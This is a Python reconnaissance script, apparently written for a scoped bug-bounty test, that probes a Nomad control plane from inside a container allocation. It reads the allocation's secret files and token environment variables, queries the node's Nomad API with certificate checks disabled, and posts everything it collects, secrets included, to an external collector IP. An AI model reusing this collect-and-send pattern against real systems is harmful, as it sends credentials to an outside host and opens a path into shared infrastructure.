#!/usr/bin/env python3
"""probe10 - characterise the node control plane reachable from inside an allocation.

probe9 found, from inside a container: the host gateway (169.254.1.2, also as the node's ULA) answers on
4646 with "Client sent an HTTP request to an HTTPS server", i.e. Nomad's HTTP API over TLS, and on 22
with an OpenSSH 10.0 banner. That is the hop a chain would need - Nomad's API exposes per-allocation
filesystem reads (/v1/client/fs/...) on the node.

This probe answers the two questions that decide whether the hop is usable, and nothing more:
  1. Does the API demand authentication? (one request to /v1/agent/self and /v1/status/leader - agent and
     cluster-status endpoints, which carry no tenant data)
  2. Does OUR OWN allocation's environment carry a token for it? (/secrets/run.env, registry-auth.env,
     api.sock - these are our allocation's own files)

Deliberate bound: no listing of allocations, jobs, nodes or namespaces. If the API turns out to be
reachable without authentication, that is a finding to report and to stop on - not a licence to read
other tenants' workspaces. The target of this engagement is a challenge sandbox; every other allocation
on that node is a real customer.
"""
from __future__ import annotations

import json
import os
import socket
import ssl
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer

COLLECTOR = "http://208.87.134.252:9200/rt10"
NODE_ADDRS = ["169.254.1.2", "fda7:a938:5bfe:5fa6:0:5e9:67ef:f8d"]
UA = "aiven-bugbounty/1.0 (Bugcrowd-zllr; researcher: zllr)"
RESULTS = {"stage": "init", "nomad": {}, "local_files": {}, "notes": []}


class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(RESULTS, indent=1).encode())

    def log_message(self, *a):
        pass


def https_get(host, port, path, token=None, timeout=10):
    """One HTTPS request. Returns (status_line, first bytes) or the error."""
    fam = socket.AF_INET6 if ":" in host else socket.AF_INET
    try:
        s = socket.socket(fam, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        t = ctx.wrap_socket(s, server_hostname=host)
        req = "GET %s HTTP/1.0\r\nHost: %s\r\nUser-Agent: %s\r\nX-Security-Testing: @zllr\r\n" % (path, host, UA)
        if token:
            req += "X-Nomad-Token: %s\r\n" % token
        req += "\r\n"
        t.sendall(req.encode())
        d = b""
        while len(d) < 1200:
            try:
                c = t.recv(600)
            except socket.timeout:
                break
            if not c:
                break
            d += c
        t.close()
        return d.decode("latin1", "replace")
    except Exception as e:                                              # noqa: BLE001
        return "ERR %s: %s" % (type(e).__name__, str(e)[:80])


def read_local(path, limit=400):
    try:
        with open(path, "rb") as fh:
            return fh.read(limit).decode("utf-8", "replace")
    except Exception as e:                                              # noqa: BLE001
        return "ERR %s: %s" % (type(e).__name__, e)


def unix_sock_get(path, req="GET / HTTP/1.0\r\n\r\n", timeout=6):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect(path)
        s.sendall(req.encode())
        d = s.recv(600)
        s.close()
        return d.decode("latin1", "replace")
    except Exception as e:                                              # noqa: BLE001
        return "ERR %s: %s" % (type(e).__name__, e)


threading.Thread(target=lambda: HTTPServer(("0.0.0.0", int(os.environ.get("PORT", "8080"))), H).serve_forever(),
                 daemon=True).start()
time.sleep(2)

# 1. own allocation's environment - may hold a token. These files are ours.
for f in ("/secrets/run.env", "/secrets/registry-auth.env"):
    RESULTS["local_files"][f] = read_local(f)
RESULTS["local_files"]["env_nomad"] = " | ".join(
    "%s=%s" % (k, v) for k, v in os.environ.items() if any(x in k.upper() for x in ("NOMAD", "TOKEN", "CONSUL")))

# 2. is the API authenticated? agent-self and cluster-status only: no tenant data in either.
for host in NODE_ADDRS:
    for path in ("/v1/agent/self", "/v1/status/leader"):
        key = "%s%s" % (host, path)
        RESULTS["nomad"][key] = https_get(host, 4646, path)[:900]
        RESULTS["notes"].append("tested %s" % key)

# 3. the api.sock the platform injects into the allocation
RESULTS["local_files"]["api.sock_ls"] = os.popen("ls -la /secrets/api.sock 2>&1").read()[:200]
RESULTS["local_files"]["api.sock_get"] = unix_sock_get("/secrets/api.sock")

RESULTS["stage"] = "done"
RESULTS["finished"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
body = json.dumps(RESULTS)
try:
    import urllib.request
    urllib.request.urlopen(urllib.request.Request(COLLECTOR, data=body.encode(),
                                                  headers={"Content-Type": "application/json"}), timeout=20)
except Exception as e:                                                  # noqa: BLE001
    print("collector post failed:", e)
print(json.dumps(RESULTS)[:2500])
while True:
    time.sleep(60)
